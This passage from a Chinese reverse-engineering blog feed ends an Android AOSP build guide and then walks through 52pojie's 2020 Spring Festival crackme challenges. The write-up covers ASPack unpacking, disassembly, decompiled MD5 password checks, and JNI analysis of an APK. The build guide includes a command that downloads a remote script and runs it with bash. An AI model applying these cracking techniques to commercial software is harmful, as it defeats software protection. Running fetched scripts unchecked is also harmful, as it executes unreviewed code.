模式相关的代码</td></tr><tr><td style="text-align:center">developers</td><td style="text-align:center">一些开发上用来参考的资料</td></tr><tr><td style="text-align:center">development</td><td style="text-align:center">Android 开发相关的代码，makekey 等</td></tr><tr><td style="text-align:center">device</td><td style="text-align:center">手机驱动的源码</td></tr><tr><td style="text-align:center">docs</td><td style="text-align:center">doc 文档</td></tr><tr><td style="text-align:center">external</td><td style="text-align:center">Android 使用的一些开源的模块</td></tr><tr><td style="text-align:center">frameworks</td><td style="text-align:center">框架</td></tr><tr><td style="text-align:center">hardware</td><td style="text-align:center">部分开源的 HAL 代码</td></tr><tr><td style="text-align:center">libcore</td><td style="text-align:center">一些核心的 lib 文件库</td></tr><tr><td style="text-align:center">libnativehelper</td><td style="text-align:center">jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数</td></tr><tr><td style="text-align:center">Makefile</td></tr><tr><td style="text-align:center">ndk</td><td style="text-align:center">ndk 代码</td></tr><tr><td style="text-align:center">out</td></tr><tr><td style="text-align:center">packages</td><td style="text-align:center">应用程序源码</td></tr><tr><td style="text-align:center">pdk</td></tr><tr><td style="text-align:center">prebuilts</td><td style="text-align:center">镜像生成依赖的一些文件，如 gcc、kernel 等</td></tr><tr><td style="text-align:center">sdk</td><td style="text-align:center">sdk 源码，模拟器源码</td></tr><tr><td style="text-align:center">system</td><td style="text-align:center">底层文件系统库、应用及组件（C 语言）</td></tr><tr><td style="text-align:center">tools</td></tr></tbody></table><h2 id="内核代码"><a href="#内核代码" class="headerlink" title="内核代码"></a>内核代码</h2><p>编译内核代码</p><pre><code class="bash">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm# git clone https://android.googlesource.com/kernel/msmcd msmgit branch -agit checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1sudo -i # 在root下进行编译export PATH=&quot;$PATH:$WORKING_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&quot;export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead_defconfigmake -j4</code></pre><p>完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像：</p><pre><code class="bash">source build/envsetup.shlunch aosp_hammerhead-userdebugmake -j4</code></pre><p>刷机：</p><pre><code>adb reboot bootloaderfastboot -w flashall</code></pre><table><thead><tr><th style="text-align:center">编译命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">m</td><td style="text-align:center">编译所有的模块</td></tr><tr><td style="text-align:center">mm</td><td style="text-align:center">编译当前目录下的模块，当前目录下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">mmm</td><td style="text-align:center">编译指定路径下的模块，指定路径下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">make snod</td><td style="text-align:center">部分编译完后，使用该命令来编译的结果整合到镜像中</td></tr></tbody></table><h2 id="使用-Docker-进行编译-Android-源码"><a href="#使用-Docker-进行编译-Android-源码" class="headerlink" title="使用 Docker 进行编译 Android 源码"></a>使用 Docker 进行编译 Android 源码</h2><p>源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下：</p><pre><code class="bash">cd &amp;&amp; mkdir buildexport AOSP_VOL=&quot;$HOME/build&quot;wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh # 连接不上的话改一下hostsbash build-kitkat.sh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://source.android.com/setup?hl=en" target="_blank" rel="noopener">https://source.android.com/setup?hl=en</a><br><a href="https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html</a><br><a href="https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html</a><br><a href="https://blog.csdn.net/u012417380/article/details/72809141" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/72809141</a><br><a href="https://blog.csdn.net/u012417380/article/details/73196722" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73196722</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73353670</a><br><a href="https://blog.csdn.net/sergeycao/article/details/46459419" target="_blank" rel="noopener">https://blog.csdn.net/sergeycao/article/details/46459419</a><br><a href="https://www.jianshu.com/p/3bdf6e9f9dfe" target="_blank" rel="noopener">https://www.jianshu.com/p/3bdf6e9f9dfe</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>2020春节-吾爱破解解题领红包活动</title>
    <link href="blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <id>blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/</id>
    <published>2020-02-11T03:37:58.000Z</published>
    <updated>2020-03-19T15:28:22.099Z</updated>
    
    <content type="html"><![CDATA[<p>第二次参加领红包活动，这次有两题是 apk。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>公众号回复直接得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/1.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳发现有 ASPack 壳，直接上 ESP 定律把壳脱掉：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/2.png" srcset="/img/loading.gif" alt></p><p>然后用 OD 看一下 dump 下来的程序，先搜索字符串，可以看到输入正确后返回的字符串：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/3.png" srcset="/img/loading.gif" alt></p><p>然后定位到具体的函数位置，看下来感觉有点复杂，但大概可以看到涉及到了三个字符串，可以判断出是类似 MD5 的哈希摘要：</p><pre><code>00617D34   .  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-0x10]00617D37   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D3D   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D3F   .  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-0x4]00617D42   .  E8 597DE1FF   CALL dumped_.0042FAA000617D47   .  8B45 F0       MOV EAX,DWORD PTR SS:[EBP-0x10]00617D4A   .  BA B87E6100   MOV EDX,dumped_.00617EB8          ;  E7EE5F4653E31955CACC7CD68E2A783900617D4F   .  E8 A42DDFFF   CALL dumped_.0040AAF800617D54   .  0F9445 E7     SETE BYTE PTR SS:[EBP-0x19]00617D58   .  33C0          XOR EAX,EAX00617D5A   .  5A            POP EDX00617D5B   .  59            POP ECX00617D5C   .  59            POP ECX00617D5D   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617D60   .  68 757D6100   PUSH dumped_.00617D7500617D65   &gt;  8D45 F0       LEA EAX,DWORD PTR SS:[EBP-0x10]00617D68   .  E8 4F1FDFFF   CALL dumped_.00409CBC00617D6D   .  C3            RETN00617D6E   .- E9 6515DFFF   JMP dumped_.004092D800617D73   .^ EB F0         JMP SHORT dumped_.00617D6500617D75   .  807D E7 00    CMP BYTE PTR SS:[EBP-0x19],0x000617D79   .  74 57         JE SHORT dumped_.00617DD200617D7B   .  33C0          XOR EAX,EAX00617D7D   .  55            PUSH EBP00617D7E   .  68 CB7D6100   PUSH dumped_.00617DCB00617D83   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617D86   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617D89   .  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617D8C   .  E8 2B1FDFFF   CALL dumped_.00409CBC00617D91   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]00617D94   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D9A   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D9C   .  8D45 F8       LEA EAX,DWORD PTR SS:[EBP-0x8]00617D9F   .  E8 7C7CE1FF   CALL dumped_.0042FA2000617DA4   .  8B45 EC       MOV EAX,DWORD PTR SS:[EBP-0x14]00617DA7   .  BA 087F6100   MOV EDX,dumped_.00617F08          ;  ea6b2efbdd4255a9f1b3bbc6399b58f400617DAC   .  E8 472DDFFF   CALL dumped_.0040AAF800617DB1   .  0F9445 E6     SETE BYTE PTR SS:[EBP-0x1A]00617DB5   .  33C0          XOR EAX,EAX00617DB7   .  5A            POP EDX00617DB8   .  59            POP ECX00617DB9   .  59            POP ECX00617DBA   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617DBD   .  68 D67D6100   PUSH dumped_.00617DD600617DC2   &gt;  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617DC5   .  E8 F21EDFFF   CALL dumped_.00409CBC00617DCA   .  C3            RETN00617DCB   .- E9 0815DFFF   JMP dumped_.004092D800617DD0   .^ EB F0         JMP SHORT dumped_.00617DC200617DD2   &gt;  C645 E6 00    MOV BYTE PTR SS:[EBP-0x1A],0x000617DD6   .  807D E6 00    CMP BYTE PTR SS:[EBP-0x1A],0x000617DDA   .  74 6D         JE SHORT dumped_.00617E4900617DDC   .  33C0          XOR EAX,EAX00617DDE   .  55            PUSH EBP00617DDF   .  68 2C7E6100   PUSH dumped_.00617E2C00617DE4   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617DE7   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617DEA   .  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617DED   .  E8 CA1EDFFF   CALL dumped_.00409CBC00617DF2   .  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-0x18]00617DF5   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617DFB   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617DFD   .  8D45 F4       LEA EAX,DWORD PTR SS:[EBP-0xC]00617E00   .  E8 1B7CE1FF   CALL dumped_.0042FA2000617E05   .  8B45 E8       MOV EAX,DWORD PTR SS:[EBP-0x18]00617E08   .  BA 587F6100   MOV EDX,dumped_.00617F58          ;  c8d46d341bea4fd5bff866a65ff8aea900617E0D   .  E8 E62CDFFF   CALL dumped_.0040AAF800617E12   .  0F9445 E5     SETE BYTE PTR SS:[EBP-0x1B]00617E16   .  33C0          XOR EAX,EAX00617E18   .  5A            POP EDX00617E19   .  59            POP ECX00617E1A   .  59            POP ECX00617E1B   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617E1E   .  68 337E6100   PUSH dumped_.00617E3300617E23   &gt;  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617E26   .  E8 911EDFFF   CALL dumped_.00409CBC00617E2B   .  C3            RETN00617E2C   .- E9 A714DFFF   JMP dumped_.004092D800617E31   .^ EB F0         JMP SHORT dumped_.00617E2300617E33   .  807D E5 00    CMP BYTE PTR SS:[EBP-0x1B],0x000617E37   .  74 10         JE SHORT dumped_.00617E4900617E39   .  83C9 FF       OR ECX,-0x100617E3C   .  83CA FF       OR EDX,-0x100617E3F   .  B8 A87F6100   MOV EAX,dumped_.00617FA8          ;  请把答案回复到论坛公众号！00617E44   .  E8 236BF5FF   CALL dumped_.0056E96C</code></pre><p>抛弃 OD，把 dump 下来的程序导入 IDA，根据前面找到的 unicode 字符串定位到函数，反编译后得到如下代码：</p><pre><code class="cpp">int __fastcall TForm1_edtPwdChange(int a1){  int v1; // ebx  int v2; // edx  int len; // eax  int md5Handler; // esi  char v5; // zf  unsigned int v7; // [esp-18h] [ebp-58h]  int *v8; // [esp-14h] [ebp-54h]  char *v9; // [esp-10h] [ebp-50h]  unsigned int v10; // [esp-Ch] [ebp-4Ch]  void *v11; // [esp-8h] [ebp-48h]  int *v12; // [esp-4h] [ebp-44h]  int v13; // [esp+8h] [ebp-38h]  int v14; // [esp+Ch] [ebp-34h]  int v15; // [esp+10h] [ebp-30h]  int v16; // [esp+14h] [ebp-2Ch]  int v17; // [esp+18h] [ebp-28h]  int v18; // [esp+1Ch] [ebp-24h]  int v19; // [esp+20h] [ebp-20h]  char v20; // [esp+25h] [ebp-1Bh]  char v21; // [esp+26h] [ebp-1Ah]  char v22; // [esp+27h] [ebp-19h]  char *string3; // [esp+28h] [ebp-18h]  char *string2; // [esp+2Ch] [ebp-14h]  char *string1; // [esp+30h] [ebp-10h]  char s3; // [esp+34h] [ebp-Ch]  char s2; // [esp+38h] [ebp-8h]  char s1; // [esp+3Ch] [ebp-4h]  int savedregs; // [esp+40h] [ebp+0h]  v1 = a1;  v12 = &amp;savedregs;  v11 = &amp;loc_617E9C;  v10 = __readfsdword(0);  __writefsdword(0, (unsigned int)&amp;v10);  sub_541DB8(*(Controls::TControl **)(a1 + 976), &amp;v19);  len = v19;  if ( v19 )    len = *(_DWORD *)(v19 - 4);  if ( len == 15 )                              // input&#39;s length should be 15  {    LOBYTE(v2) = 1;    md5Handler = sub_616B84(&amp;cls_IdHashMessageDigest_TIdHashMessageDigest5, v2);// get MD5 handler    v9 = &amp;s1;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v17);    sub_50F2EC(v17, 7, &amp;v18);    registerFunc(md5Handler, v18, 0, (int)&amp;s1);    v9 = &amp;s2;    v8 = &amp;v16;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v15);    Compprod::TComponentsPageProducer::HandleTag(&amp;v16);    registerFunc(md5Handler, v16, 0, (int)&amp;s2);    v9 = &amp;s3;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v13);    unknown_libname_807(v13, 4, &amp;v14);    registerFunc(md5Handler, v14, 0, (int)&amp;s3);    v9 = (char *)&amp;savedregs;    v8 = (int *)&amp;loc_617D6E;    v7 = __readfsdword(0);    __writefsdword(0, (unsigned int)&amp;v7);    freeMem(&amp;string1);    sub_42FAA0((int *)&amp;s1, 0, (int *)&amp;string1);    compareStr(string1, (char *)L&quot;E7EE5F4653E31955CACC7CD68E2A7839&quot;);// compare string1    v22 = v5;    __writefsdword(0, v7);    v9 = (char *)&amp;loc_617D75;    freeMem(&amp;string1);    if ( v22 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617DCB;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string2);      sub_42FA20(&amp;s2, 0, &amp;string2);      compareStr(string2, (char *)L&quot;ea6b2efbdd4255a9f1b3bbc6399b58f4&quot;);// compare string2      v21 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617DD6;      freeMem(&amp;string2);    }    else    {      v21 = 0;    }    if ( v21 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617E2C;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string3);      sub_42FA20(&amp;s3, 0, &amp;string3);      compareStr(string3, (char *)L&quot;c8d46d341bea4fd5bff866a65ff8aea9&quot;);// compare string3      v20 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617E33;      freeMem(&amp;string3);      if ( v20 )                                // Success        createDialog((int)L&quot;请把答案回复到论坛公众号！&quot;, -1, -1);    }  }  __writefsdword(0, v10);  v12 = (int *)&amp;loc_617EA3;  freeMem(&amp;v13);  freeMem(&amp;v14);  freeMem(&amp;v15);  freeMem(&amp;v16);  freeMem(&amp;v17);  freeMem(&amp;v18);  freeMem(&amp;v19);  return sub_409D1C(&amp;string3, 6);}</code></pre><p>反编译后的代码也比较含糊，但可以猜到，输入的字符串长度为 15，字符串被分成了 3 部分，每部分分别进行 MD5 哈希，并与内存中的字符串进行比较，字符串正确就会弹出一个正确的对话窗口。MD5 在理论上是不可逆的，但可以在通过搜索引擎查找网上已经被爆破出的对应的明文。第一部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/4.png" srcset="/img/loading.gif" alt></p><p>第二部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/5.png" srcset="/img/loading.gif" alt></p><p>第三部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/6.png" srcset="/img/loading.gif" alt></p><p>将得到的字符串拼接并进行验证：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/7.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/8.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这题给的是一个 apk，先使用 jdax 打开，查看程序入口点 MainActivity，得到如下代码：</p><pre><code class="java">package com.wuaipojie.crackme01;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity implements OnClickListener {    private Button btn_click;    private EditText editText;    private native boolean checkFlag(String str);    public native void onClick(View view);    static {        /* JADX: method processing error *//*Error: java.lang.NullPointerException    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.searchTryCatchDominators(ProcessTryCatchRegions.java:75)    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.process(ProcessTryCatchRegions.java:45)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.postProcessRegions(RegionMakerVisitor.java:63)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:58)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)    at jadx.core.ProcessClass.process(ProcessClass.java:37)    at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:280)    at jadx.api.JavaClass.decompile(JavaClass.java:62)*/        /*        r0 = &quot;crack_j2c&quot;;     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }        java.lang.System.loadLibrary(r0);     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }    L_0x0005:        return;        */        throw new UnsupportedOperationException(&quot;Method not decompiled: com.wuaipojie.crackme01.MainActivity.&lt;clinit&gt;():void&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.editText = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn_click = button;        button.setOnClickListener(this);    }}</code></pre><p>主要有三个函数，<code>onCreate()</code> 在 Java 层中实现，可以看出整个界面中有一个文本框和一个按钮，并设置了一个按钮的监听事件，即 onClick；<code>onClick()</code> 和 <code>checkFlag()</code> 可以看到是在 Native 层进行实现的，可以从 lib 文件夹中找到 so 文件，接下来用 IDA 对 so 中的两个函数进行分析。导入 IDA 后，通过函数名可以看出两个函数通过静态注册：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/9.png" srcset="/img/loading.gif" alt></p><p>然后先来看 onClick 函数。这边略过一些导入 jni.h 等一些分析的过程（一般静态注册函数的第一个参数是 JNIEnv 等等），在分析的过程中大致猜测出两个函数 <code>sub_5288</code> 和 <code>sub_539C</code> 两个函数分别用来获取指定的方法（getMethod）或者是域（getField）。接下来直接来看分析过后的代码：</p><pre><code class="cpp">int __fastcall Java_com_wuaipojie_crackme01_MainActivity_onClick__Landroid_view_View_2(_JNIEnv *env, int a2, int a3){  _JNIEnv *env_; // r4  int v4; // r5  int v5; // r9  int v6; // r0  int v7; // r5  jstring (__cdecl *v8)(JNIEnv *, const char *); // r2  int v9; // r6  int v10; // r8  int v11; // r6  int v12; // r8  int len; // r5  int v14; // r5  const char *v15; // r1  int v16; // r6  int v17; // r5  int result; // r0  JNINativeMethod method; // [sp+4h] [bp-74h]  int v20; // [sp+10h] [bp-68h]  int v21; // [sp+14h] [bp-64h]  int v22; // [sp+18h] [bp-60h]  int v23; // [sp+1Ch] [bp-5Ch]  int v24; // [sp+20h] [bp-58h]  int v25; // [sp+24h] [bp-54h]  int a3a; // [sp+28h] [bp-50h]  int v27; // [sp+2Ch] [bp-4Ch]  int v28; // [sp+30h] [bp-48h]  int v29; // [sp+34h] [bp-44h]  int v30; // [sp+38h] [bp-40h]  int a2a; // [sp+3Ch] [bp-3Ch]  int v32; // [sp+40h] [bp-38h]  int v33; // [sp+48h] [bp-30h]  int v34; // [sp+50h] [bp-28h]  int v35; // [sp+58h] [bp-20h]  env_ = env;  v4 = a3;  a2a = 0;  v29 = 0;  v30 = 0;  v27 = 0;  v28 = 0;  v25 = 0;  a3a = 0;  v23 = 0;  v24 = 0;  v21 = 0;  v22 = 0;  method.fnPtr = 0;  v20 = 0;  v5 = ((int (__fastcall *)(_JNIEnv *, int))env-&gt;functions-&gt;NewLocalRef)(env, a2);  v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;NewLocalRef)(env_, v4);  if ( !v5 )    goto LABEL_38;  v7 = v6;  method.name = &quot;editText&quot;;  method.signature = &quot;Landroid/widget/EditText;&quot;;  if ( getFields(env_, &amp;a2a, &amp;a3a, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )    goto LABEL_39;  v9 = ((int (__fastcall *)(_JNIEnv *, int, int))env_-&gt;functions-&gt;GetObjectField)(env_, v5, a3a);  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( v7 )    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v7);  if ( !v9 )    goto LABEL_38;  if ( !v25 )  {    method.name = &quot;getText&quot;;    method.signature = &quot;()Landroid/text/Editable;&quot;;    if ( getMethods(env_, &amp;v30, &amp;v25, 0, &quot;android/widget/EditText&quot;, method) )      goto LABEL_39;  }  v10 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v9);// get input string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v9);  if ( !v10 )    goto LABEL_38;  if ( !v24 )  {    method.name = &quot;toString&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v29, &amp;v24, 0, &quot;java/lang/Object&quot;, method) )      goto LABEL_39;  }  v11 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v10);// convert object to string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v10);  if ( !v11 )    goto LABEL_38;  if ( !v23 )  {    method.name = &quot;trim&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v28, &amp;v23, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  v12 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v11);// trim string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v11);  if ( !v12 )    goto LABEL_38;  if ( !v22 )  {    method.name = &quot;length&quot;;    method.signature = &quot;()I&quot;;    if ( getMethods(env_, &amp;v28, &amp;v22, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallIntMethodA)(env_, v12);// get string&#39;s length  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( len == 30 )                              // len(flag) == 30  {    if ( !v21 )    {      method.name = &quot;checkFlag&quot;;      method.signature = &quot;(Ljava/lang/String;)Z&quot;;      if ( getMethods(env_, &amp;a2a, &amp;v21, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )        goto LABEL_39;    }    v32 = v12;    v14 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v5);// invoke checkFlag method    if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      goto LABEL_39;    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v8 = env_-&gt;functions-&gt;NewStringUTF;    if ( !v14 )      goto LABEL_40;    v15 = &quot;正确！！！回复你输入的内容到吾爱破解论坛公众号&quot;;            // correct  }  else  {    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v15 = &quot;flag长度必须为30位&quot;;                       // flag&#39;s length must equal to 30    v8 = env_-&gt;functions-&gt;NewStringUTF;  }  while ( 1 )  {    v16 = ((int (__fastcall *)(_JNIEnv *, const char *))v8)(env_, v15);    if ( v20      || (method.name = &quot;makeText&quot;,          method.signature = &quot;(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;&quot;,          !getMethods(env_, &amp;v27, &amp;v20, 1, &quot;android/widget/Toast&quot;, method)) )    {      v33 = v16;      v32 = v5;      v34 = 0;      v17 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v27);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        if ( v16 )          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v16);        if ( v17 )        {          if ( method.fnPtr            || (method.name = &quot;show&quot;,                method.signature = &quot;()V&quot;,                !getMethods(env_, &amp;v27, (int *)&amp;method.fnPtr, 0, &quot;android/widget/Toast&quot;, method)) )          {            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallVoidMethodA)(env_, v17);            ((void (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_);          }        }        else        {LABEL_38:          sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);        }      }    }LABEL_39:    result = _stack_chk_guard - v35;    if ( _stack_chk_guard == v35 )      break;LABEL_40:    v15 = &quot;验证错误，继续加油&quot;;                          // wrong  }  return result;}</code></pre><p>onClick 函数中的内容主要为在点击按钮后获取输入内容，并判断输入的字符串长度是否为 30，然后调用 checkFlag 函数对字符串进行判断。接下来再看看 checkFlag 函数，这个函数比较长，分成几段来看。首先调用了 <code>isDebuggerConnected()</code> 函数，猜测应该是用来反调试：</p><pre><code class="cpp">  method1.name = &quot;isDebuggerConnected&quot;;  method1.signature = &quot;()Z&quot;;  if ( !getMethods(env_, &amp;jclass, &amp;jmethodid, 1, &quot;android/os/Debug&quot;, method1) )// anti-debug??  {    t1 = (unsigned int)&amp;t_;    v8 = ((int (__fastcall *)(_JNIEnv *, int, int, int *))env_-&gt;functions-&gt;CallStaticBooleanMethodA)(           env_,           jclass,           jmethodid,           &amp;t_);    if ( !(((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) | v8) )    {      key1 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 9);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        goto LABEL_7;    }    goto LABEL_4;  }</code></pre><p>接下来将一串字符串分成三部分（key1 = “thisiskey”，key2 = “52pojie_2020_happy_chinese_new_year”，key3 = “20200125”）并分给了三个变量：</p><pre><code class="cpp">    v6 = 0;    ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, const char *))env_-&gt;functions-&gt;SetByteArrayRegion)(      env_,      key1,      0,      9,      &quot;thisiskey52pojie_2020_happy_chinese_new_year20200125&quot;);// key1 = &quot;thisiskey&quot;    key2 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);    if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    {      v6 = 0;      ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(        env_,        key2,        0,        35,        &quot;52pojie_2020_happy_chinese_new_year20200125&quot;);// key2 = &quot;52pojie_2020_happy_chinese_new_year&quot;      key3 = ((int (__fastcall *)(_JNIEnv *, signed 